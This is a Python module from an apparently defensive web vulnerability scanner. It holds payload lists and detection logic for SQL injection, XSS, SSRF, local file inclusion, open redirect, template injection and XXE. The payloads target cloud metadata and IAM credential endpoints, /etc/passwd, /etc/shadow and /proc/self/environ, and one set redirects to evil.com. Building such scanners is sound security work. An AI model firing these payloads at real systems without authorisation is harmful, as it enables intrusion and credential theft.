# web_tester.py
from __future__ import annotations

import re
import time
from http.cookies import SimpleCookie
from urllib.parse import parse_qsl, urlencode, urlparse, urlunparse

from rich.progress import SpinnerColumn, TextColumn, TimeElapsedColumn, Progress

from .utils import ScanContext, add_finding, add_warning, get_url, post_url, tls_certificate

# ── Payload lists ──────────────────────────────────────────────────────────────

SQL_PAYLOADS = [
    # Error-based
    "'", '"', "\\", ";", "`",
    "' OR '1'='1", "' OR 1=1--", "' OR 1=1#",
    "\" OR \"1\"=\"1",
    # Blind boolean
    "' AND 1=1--", "' AND 1=2--",
    "' AND SLEEP(5)--",        # MySQL time-based
    "'; WAITFOR DELAY '0:0:5'--",  # MSSQL time-based
    "' AND 1=1 AND SLEEP(5)--",
    # UNION-based
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL--",
]

SQL_ERRORS = [
    "you have an error in your sql syntax",
    "warning: mysql_",
    "warning: mysqli_",
    "ora-01756",
    "ora-00933",
    "microsoft ole db",
    "unclosed quotation mark",
    "pg_query()",
    "sqliteexception",
    "sqlite3.operationalerror",
    "syntax error in query",
    "pdoexception",
    "invalid query",
    "db2 sql error",
    "jdbc exception",
    "[ibm][cli driver]",
    "unterminated string literal",
]

XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "\"><svg onload=alert(1)>",
    "javascript:alert(1)",
    "<body onload=alert(1)>",
    "'><script>alert(1)</script>",
    "<iframe src=javascript:alert(1)>",
    "<details open ontoggle=alert(1)>",
]

SSRF_PAYLOADS = [
    "http://127.0.0.1",
    "http://localhost",
    "http://[::1]",
    "http://0.0.0.0",
    "http://169.254.169.254/latest/meta-data/",          # AWS IMDSv1
    "http://169.254.169.254/latest/meta-data/iam/",       # AWS IAM
    "http://169.254.169.254/computeMetadata/v1/",         # GCP
    "http://169.254.169.254/metadata/instance?api-version=2021-02-01",  # Azure
    "http://100.100.100.200/latest/meta-data/",           # Alibaba Cloud
    "http://0177.0.0.1",          # Octal bypass
    "http://2130706433",          # Decimal bypass for 127.0.0.1
    "http://internal-service:8080",
    "file:///etc/passwd",
    "dict://127.0.0.1:6379/info",   # Redis via DICT protocol
    "gopher://127.0.0.1:6379/_INFO%0d%0a",
]

SSRF_INDICATORS = re.compile(
    r"ami-id|instance-id|ec2metadata|metadata\.google|managedidentity"
    r"|iam/security-credentials|redis_version|OpenSSH"
    r"|root:x:|localhost|127\.0\.0\.1",
    re.I,
)

LFI_PAYLOADS = [
    "../../../../etc/passwd",
    "../../../../etc/shadow",
    "../../../../windows/win.ini",
    "../../../../windows/system32/drivers/etc/hosts",
    "....//....//....//etc/passwd",
    "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "..%252f..%252fetc%252fpasswd",   # Double URL encode
    "%252e%252e%252f%252e%252e%252fetc%252fpasswd",
    "php://filter/convert.base64-encode/resource=index.php",
    "php://input",
    "phar://uploaded.jpg",
    "/proc/self/environ",
    "/proc/self/cmdline",
]

LFI_INDICATORS = re.compile(
    r"root:x:|daemon:x:|bin:x:"          # /etc/passwd
    r"|\[extensions\]"                    # win.ini
    r"|PD9waH|<\?php"                    # PHP base64 / source
    r"|DOCUMENT_ROOT|HTTP_HOST"           # /proc/self/environ
    r"|cmdline",
    re.I,
)

OPEN_REDIRECT_PAYLOADS = [
    "https://evil.com",
    "//evil.com",
    "/\\evil.com",
    "https://evil.com/%2F..",
    "//evil.com/%2f%2e%2e",
]

# Server-Side Template Injection probes — mathematical expressions whose
# evaluated result differs from the literal string
SSTI_PAYLOADS = [
    ("{{7*7}}", "49"),             # Jinja2 / Twig
    ("${7*7}", "49"),              # FreeMarker / EL
    ("<%= 7*7 %>", "49"),          # ERB (Ruby)
    ("#{7*7}", "49"),              # Pebble / Jinja2
    ("{{7*'7'}}", "7777777"),      # Jinja2 specific
    ("%{7*7}", "49"),              # Velocity
]

# XXE payloads for XML endpoints
XXE_PAYLOAD_UNIX = """<?xml version="1.0"?>
<!DOCTYPE test [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<test>&xxe;</test>"""

XXE_PAYLOAD_SSRF = """<?xml version="1.0"?>
<!DOCTYPE test [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<test>&xxe;</test>"""

XXE_INDICATORS = re.compile(r"root:x:|daemon:x:|ami-id|instance-id", re.I)


def run(ctx: ScanContext, console) -> None:
    from .wizard import PhaseProgress

    url_count  = len(ctx.crawl.get("urls", []))
    form_count = len(ctx.crawl.get("forms", []))

    with PhaseProgress(console, "Phase 4 - Web Application Testing") as pp:
        pp.step("Security header audit + cookie attribute checks")
        _headers_and_cookies(ctx, console)

        if ctx.base_url and ctx.base_url.startswith("https"):
            pp.step("TLS version + cipher suite analysis")
            _tls(ctx, console)

        if url_count:
            pp.step(f"GET parameter injection tests  ({url_count} URLs · SQLi · XSS · SSRF · LFI · Open Redirect · SSTI)")
            _parameter_tests(ctx, console)
        else:
            pp.warn("No crawled URLs with parameters — skipping GET injection tests")

        if form_count:
            pp.step(f"POST form injection tests  ({form_count} forms · SQLi · XSS · XXE · SSTI)")
            _form_tests(ctx, console)
        else:
            pp.warn("No POST forms discovered — skipping form injection tests")

        pp.step("IDOR candidate detection  (numeric object IDs in URL paths)")
        _idor_candidates(ctx)

        pp.done()


# ── Header / cookie / TLS checks ──────────────────────────────────────────────

def _headers_and_cookies(ctx: ScanContext, console) -> None:
    if not ctx.base_url:
        return
    try:
        response = get_url(ctx.base_url)
        headers = {key.lower(): value for key, value in response.headers.items()}

        REQUIRED_HEADERS = {
            "strict-transport-security": "Missing HSTS",
            "content-security-policy": "Missing CSP",
            "x-frame-options": "Missing X-Frame-Options",
            "x-content-type-options": "Missing X-Content-Type-Options",
            "referrer-policy": "Missing Referrer-Policy",
        }
        for header, key in REQUIRED_HEADERS.items():
            if header not in headers:
                add_finding(ctx, key,
                            f"GET {ctx.base_url}\nResponse did not include header: {header}",
                            category="Web",
                            references=["https://owasp.org/www-project-secure-headers/"])

        # CORS wildcard
        acao = headers.get("access-control-allow-origin", "")
        if acao == "*":
            add_finding(ctx, "Open CORS",
                        f"Access-Control-Allow-Origin: {acao}\nEndpoint: {ctx.base_url}",
                        category="Web",
                        references=["https://owasp.org/www-community/attacks/CORS_OriginHeaderScrutiny"])

        # Server / X-Powered-By already checked in passive_recon; skip duplicate here
        # unless passive recon was not run
        if ctx.mode not in {"Full Assessment", "Passive Recon Only"}:
            if "server" in headers:
                add_finding(ctx, "Server header disclosure", f"Server: {headers['server']}", category="Config")
            if "x-powered-by" in headers:
                add_finding(ctx, "Server header disclosure", f"X-Powered-By: {headers['x-powered-by']}",
                            category="Config", name="X-Powered-By disclosure")

        # Cookie attribute audit
        raw_set_cookie = response.headers.get("Set-Cookie", "")
        set_cookie_list = (
            response.headers.get_all("Set-Cookie")
            if hasattr(response.headers, "get_all")
            else [raw_set_cookie] if raw_set_cookie else []
        )
        for cookie_header in set_cookie_list:
            if not cookie_header:
                continue
            cookie = SimpleCookie()
            try:
                cookie.load(cookie_header)
            except Exception:
                continue
            raw_lower = cookie_header.lower()
            for name in cookie:
                if "httponly" not in raw_lower:
                    add_finding(ctx, "Cookie missing HttpOnly",
                                f"Cookie '{name}' from {ctx.base_url} lacks HttpOnly flag.\nSet-Cookie: {cookie_header[:200]}",
                                category="Web")
                if ctx.base_url.startswith("https") and "secure" not in raw_lower:
                    add_finding(ctx, "Cookie missing Secure",
                                f"Cookie '{name}' from {ctx.base_url} lacks Secure flag.",
                                category="Web")
                if "samesite" not in raw_lower:
                    add_finding(ctx, "Missing Referrer-Policy",
                                f"Cookie '{name}' lacks SameSite attribute.",
                                category="Web",
                                name="Cookie missing SameSite attribute")

    except Exception as exc:
        add_warning(ctx, console, f"Header/cookie checks failed: {exc}")


def _tls(ctx: ScanContext, console) -> None:
    if not ctx.base_url or not ctx.base_url.startswith("https"):
        return
    try:
        cert = tls_certificate(ctx.host)
        ctx.service_notes.append({"service": "TLS certificate", "target": ctx.host, "result": str(cert)})
        tls_ver = cert.get("tls_version", "")
        if tls_ver in ("TLSv1", "TLSv1.1", "SSLv3", "SSLv2"):
            add_finding(ctx, "Weak TLS",
                        f"Negotiated: {tls_ver}\nCipher: {cert.get('cipher')}\nHost: {ctx.host}",
                        category="Web",
                        references=["https://www.rfc-editor.org/rfc/rfc8996"])
    except Exception as exc:
        add_warning(ctx, console, f"TLS certificate check failed: {exc}")


# ── GET parameter injection tests ─────────────────────────────────────────────

def _parameter_tests(ctx: ScanContext, console) -> None:
    urls = list(dict.fromkeys(
        ([ctx.base_url] if ctx.base_url else []) + ctx.crawl.get("urls", [])
    ))
    for url in urls[:150]:
        params = parse_qsl(urlparse(url).query, keep_blank_values=True)
        if not params:
            continue
        _test_sql(ctx, url, params)
        _test_xss(ctx, url, params)
        _test_ssrf(ctx, url, params)
        _test_lfi(ctx, url, params)
        _test_open_redirect(ctx, url, params)
        _test_ssti(ctx, url, params)


def _replace_param(url: str, name: str, value: str) -> str:
    parsed = urlparse(url)
    params = parse_qsl(parsed.query, keep_blank_values=True)
    query = urlencode([(key, value if key == name else old) for key, old in params])
    return urlunparse(parsed._replace(query=query))


def _test_sql(ctx: ScanContext, url: str, params: list[tuple[str, str]]) -> None:
    baseline_len: int | None = None
    baseline_text: str = ""
    try:
        br = get_url(url, timeout=12)
        baseline_len = len(br.text)
        baseline_text = br.text.lower()
    except Exception:
        pass

    for name, _ in params:
        for payload in SQL_PAYLOADS:
            ctx.tested_payloads.append(f"SQLi | {url} | {name}={payload}")
            try:
                test_url = _replace_param(url, name, payload)
                start = time.time()
                response = get_url(test_url, timeout=15)
                elapsed = time.time() - start
                body = response.text
                body_lower = body.lower()

                # Error-based detection
                error_hit = any(err in body_lower for err in SQL_ERRORS)
                # Time-based detection — require >= 4.5s and payload was time-based
                time_hit = (elapsed >= 4.5 and ("SLEEP" in payload.upper() or "WAITFOR" in payload.upper()))
                # Length deviation — significant change from baseline (tuned to reduce false positives)
                len_hit = (
                    baseline_len is not None
                    and abs(len(body) - baseline_len) > max(800, baseline_len * 0.5)
                    and error_hit  # require an error marker alongside length shift
                )

                if error_hit or time_hit or len_hit:
                    evidence = (
                        f"URL: {test_url}\n"
                        f"Parameter: {name}\nPayload: {payload}\n"
                        f"Status: {response.status_code}\nResponse time: {elapsed:.1f}s\n"
                        f"Detection: {'error-based' if error_hit else 'time-based' if time_hit else 'length-based'}\n"
                        f"Body sample:\n{body[:1500]}"
                    )
                    add_finding(ctx, "SQL Injection", evidence, category="Web",
                                references=["https://owasp.org/www-community/attacks/SQL_Injection"])
                    return
            except Exception:
                continue


def _test_xss(ctx: ScanContext, url: str, params: list[tuple[str, str]]) -> None:
    for name, _ in params:
        for payload in XSS_PAYLOADS:
            ctx.tested_payloads.append(f"XSS | {url} | {name}={payload}")
            try:
                test_url = _replace_param(url, name, payload)
                response = get_url(test_url, timeout=12)
                ct = response.headers.get("Content-Type", "").lower()
                if "text/html" not in ct:
                    continue
                # Confirm raw unescaped reflection (not HTML-encoded version)
                if payload in response.text:
                    # Extra check: not inside a comment or script src
                    add_finding(ctx, "XSS Reflected",
                                f"URL: {test_url}\nParameter: {name}\nPayload reflected unescaped in HTML response.\n"
                                f"Body context:\n{_extract_context(response.text, payload)}",
                                category="Web",
                                references=["https://owasp.org/www-community/attacks/xss/"])
                    return
            except Exception:
                continue


def _test_ssrf(ctx: ScanContext, url: str, params: list[tuple[str, str]]) -> None:
    url_like_params = {"url", "uri", "path", "redirect", "next", "return", "callback",
                       "webhook", "image", "src", "dest", "target", "endpoint", "host",
                       "link", "fetch", "load", "proxy", "resource"}
    for name, _ in params:
        if name.lower() not in url_like_params:
            continue
        for payload in SSRF_PAYLOADS:
            ctx.tested_payloads.append(f"SSRF | {url} | {name}={payload}")
            try:
                response = get_url(_replace_param(url, name, payload), timeout=12)
                if SSRF_INDICATORS.search(response.text):
                    add_finding(ctx, "SSRF",
                                f"Parameter '{name}' with payload '{payload}' returned internal-looking content.\n"
                                f"URL: {_replace_param(url, name, payload)}\n"
                                f"Body sample:\n{response.text[:1500]}",
                                category="Web",
                                references=["https://owasp.org/www-community/attacks/Server_Side_Request_Forgery"])
                    return
            except Exception:
                continue


def _test_lfi(ctx: ScanContext, url: str, params: list[tuple[str, str]]) -> None:
    file_like_params = {"page", "file", "path", "include", "template", "view",
                        "document", "doc", "load", "read", "content", "filename", "module"}
    for name, _ in params:
        if name.lower() not in file_like_params:
            continue
        for payload in LFI_PAYLOADS:
            ctx.tested_payloads.append(f"LFI | {url} | {name}={payload}")
            try:
                response = get_url(_replace_param(url, name, payload), timeout=12)
                if LFI_INDICATORS.search(response.text):
                    add_finding(ctx, "LFI",
                                f"Parameter '{name}' with payload '{payload}' returned file content.\n"
                                f"URL: {_replace_param(url, name, payload)}\n"
                                f"Body sample:\n{response.text[:1500]}",
                                category="Web",
                                references=["https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion"])
                    return
            except Exception:
                continue


def _test_open_redirect(ctx: ScanContext, url: str, params: list[tuple[str, str]]) -> None:
    redirect_params = {"redirect", "url", "next", "return", "goto", "dest",
                       "destination", "continue", "rurl", "target", "out", "view"}
    for name, _ in params:
        if name.lower() not in redirect_params:
            continue
        for payload in OPEN_REDIRECT_PAYLOADS:
            ctx.tested_payloads.append(f"Open Redirect | {url} | {name}={payload}")
            try:
                response = get_url(_replace_param(url, name, payload), allow_redirects=False, timeout=12)
                location = response.headers.get("Location", "")
                if response.status_code in {301, 302, 303, 307, 308} and "evil.com" in location:
                    add_finding(ctx, "Open Redirect",
                                f"URL: {_replace_param(url, name, payload)}\n"
                                f"Parameter: {name}\nPayload: {payload}\n"
                                f"Location header: {location}",
                                category="Web",
                                references=["https://owasp.org/www-community/attacks/Unvalidated_Redirects_and_Forwards_Cheat_Sheet"])
                    return
            except Exception:
                continue


def _test_ssti(ctx: ScanContext, url: str, params: list[tuple[str, str]]) -> None:
    """Detect server-side template injection by sending math expressions and checking for evaluation."""
    for name, _ in params:
        for payload, expected in SSTI_PAYLOADS:
            ctx.tested_payloads.append(f"SSTI | {url} | {name}={payload}")
            try:
                test_url = _replace_param(url, name, payload)
                response = get_url(test_url, timeout=12)
                if expected in response.text:
                    add_finding(ctx, "RCE via SSTI",
                                f"URL: {test_url}\nParameter: {name}\n"
                                f"Payload: {payload}\nExpected evaluation result '{expected}' found in response.\n"
                                f"Body context:\n{_extract_context(response.text, expected)}",
                                category="Web",
                                references=["https://portswigger.net/research/server-side-template-injection"])
                    return
            except Exception:
                continue


# ── Form-based POST injection tests ───────────────────────────────────────────

def _form_tests(ctx: ScanContext, console) -> None:
    """Test POST forms discovered during crawling for injection vulnerabilities."""
    forms = ctx.crawl.get("forms", [])[:50]
    for form in forms:
        action = form.get("action") or ctx.base_url
        if not action:
            continue
        inputs = form.get("inputs", [])
        param_names = [inp["name"] if isinstance(inp, dict) else inp for inp in inputs if inp]
        if not param_names:
            continue
        method = form.get("method", "GET").upper()
        if method != "POST":
            continue
        _test_sql_post(ctx, action, param_names)
        _test_xss_post(ctx, action, param_names)
        _test_xxe_post(ctx, action)
        _test_ssti_post(ctx, action, param_names)


def _test_sql_post(ctx: ScanContext, action: str, fields: list[str]) -> None:
    for field in fields:
        for payload in SQL_PAYLOADS[:5]:  # Limit to avoid excessive requests
            ctx.tested_payloads.append(f"SQLi POST | {action} | {field}={payload}")
            data = {f: "test" for f in fields}
            data[field] = payload
            try:
                start = time.time()
                response = post_url(action, data=data, timeout=15)
                elapsed = time.time() - start
                body_lower = response.text.lower()
                error_hit = any(err in body_lower for err in SQL_ERRORS)
                time_hit = elapsed >= 4.5 and ("SLEEP" in payload.upper() or "WAITFOR" in payload.upper())
                if error_hit or time_hit:
                    add_finding(ctx, "SQL Injection",
                                f"POST {action}\nField: {field}\nPayload: {payload}\n"
                                f"Detection: {'error-based' if error_hit else 'time-based'}\n"
                                f"Body sample:\n{response.text[:1000]}",
                                category="Web",
                                name="SQL Injection (POST form)")
                    return
            except Exception:
                continue


def _test_xss_post(ctx: ScanContext, action: str, fields: list[str]) -> None:
    for field in fields:
        payload = "<script>alert(1)</script>"
        ctx.tested_payloads.append(f"XSS POST | {action} | {field}={payload}")
        data = {f: "test" for f in fields}
        data[field] = payload
        try:
            response = post_url(action, data=data, timeout=12)
            if "text/html" in response.headers.get("Content-Type", "").lower() and payload in response.text:
                add_finding(ctx, "XSS Reflected",
                            f"POST {action}\nField: {field}\nPayload reflected unescaped in response.",
                            category="Web",
                            name="XSS Reflected (POST form)")
                return
        except Exception:
            continue


def _test_xxe_post(ctx: ScanContext, action: str) -> None:
    """POST XML payloads to forms or endpoints accepting XML."""
    for payload in (XXE_PAYLOAD_UNIX, XXE_PAYLOAD_SSRF):
        ctx.tested_payloads.append(f"XXE | {action}")
        try:
            response = post_url(
                action,
                data=payload,
                timeout=12,
                headers={"Content-Type": "application/xml"},
            )
            if XXE_INDICATORS.search(response.text):
                add_finding(ctx, "XXE Injection",
                            f"POST {action}\nXML payload triggered file/SSRF response.\nBody sample:\n{response.text[:1500]}",
                            category="Web",
                            references=["https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing"])
                return
        except Exception:
            continue


def _test_ssti_post(ctx: ScanContext, action: str, fields: list[str]) -> None:
    for field in fields:
        for payload, expected in SSTI_PAYLOADS[:3]:
            ctx.tested_payloads.append(f"SSTI POST | {action} | {field}={payload}")
            data = {f: "test" for f in fields}
            data[field] = payload
            try:
                response = post_url(action, data=data, timeout=12)
                if expected in response.text:
                    add_finding(ctx, "RCE via SSTI",
                                f"POST {action}\nField: {field}\nPayload: {payload}\n"
                                f"Evaluated result '{expected}' found in response.",
                                category="Web",
                                name="SSTI (POST form)")
                    return
            except Exception:
                continue


# ── IDOR heuristic ────────────────────────────────────────────────────────────

def _idor_candidates(ctx: ScanContext) -> None:
    idor_pattern = re.compile(
        r"/(?:user|users|order|orders|file|files|account|accounts|invoice|invoices"
        r"|profile|profiles|ticket|tickets|document|documents|record|records)/\d+",
        re.I,
    )
    reported_patterns: set[str] = set()
    for url in ctx.crawl.get("urls", []):
        match = idor_pattern.search(url)
        if not match:
            continue
        pattern_key = match.group(0).rsplit("/", 1)[0]  # e.g. /user/
        if pattern_key in reported_patterns:
            continue
        reported_patterns.add(pattern_key)
        add_finding(ctx, "Sensitive file exposed",
                    f"Numeric object identifier observed in URL: {url}\nPattern: {pattern_key}/<id>",
                    category="Web",
                    name=f"Potential IDOR: {pattern_key}",
                    description="Numeric object identifiers in URL paths may allow horizontal privilege escalation. Manual authorization testing required to confirm.")


# ── Helpers ───────────────────────────────────────────────────────────────────

def _extract_context(html: str, needle: str, window: int = 200) -> str:
    """Return a snippet of HTML centred around the first occurrence of needle."""
    idx = html.find(needle)
    if idx == -1:
        return html[:window]
    start = max(0, idx - window // 2)
    end = min(len(html), idx + len(needle) + window // 2)
    return html[start:end]